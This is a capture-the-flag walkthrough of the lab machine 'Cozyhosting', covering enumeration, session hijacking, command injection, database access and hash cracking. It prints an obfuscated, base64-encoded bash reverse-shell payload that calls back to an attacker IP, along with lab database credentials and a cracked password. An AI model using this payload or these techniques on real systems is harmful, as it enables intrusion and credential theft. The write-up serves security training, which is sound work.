# Cozyhosting

## Enumeration

### NMAP

```
nmap -sCV -T5 10.129.229.88
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-19 13:26 PST
Warning: 10.129.229.88 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.229.88
Host is up (0.089s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp   open     http         nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
1201/tcp filtered nucleus-sand
1594/tcp filtered sixtrak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.71 seconds
```

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

### FeroxBuster



```
feroxbuster -u http://cozyhosting.htb -x pdf -x js,html -x php txt json,docx
```

### DirSearch

```
dirsearch -u http://cozyhosting.htb
```

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

### Web Enumeration

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

The web page seems to be running Spring Boot

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

## Foothold

It seems that we can view the sessions

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Paste in kandersons cookie and hit refresh on the browser

### Command Injection

Capture the request to add a host name and identify that command injection is plausible&#x20;

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

generate the payload for the reverse shell

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

```rust
;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzQ0NDQgMD4mMQ=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;

```

URL Encode Key Characters in Burp

### Reverseshell

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

and catch shell in NC listener

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

## Privledge Esc from app

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

### jd-gui

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

### Postgres DB

```
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Stabilize the shell

```
app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres
Password for user postgres:
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
```

```
-l
```

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Database cozyhosting

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

```
\d
```

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

```
select * from users;
```

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

### Hashcat

```
hashcat -a 0 -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

```
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

This was not the admin password like it states but we have a user named josh

```
app@cozyhosting:/home$ ls
josh
app@cozyhosting:/home$
```

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

## Privilege Esc from Josh to Root

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
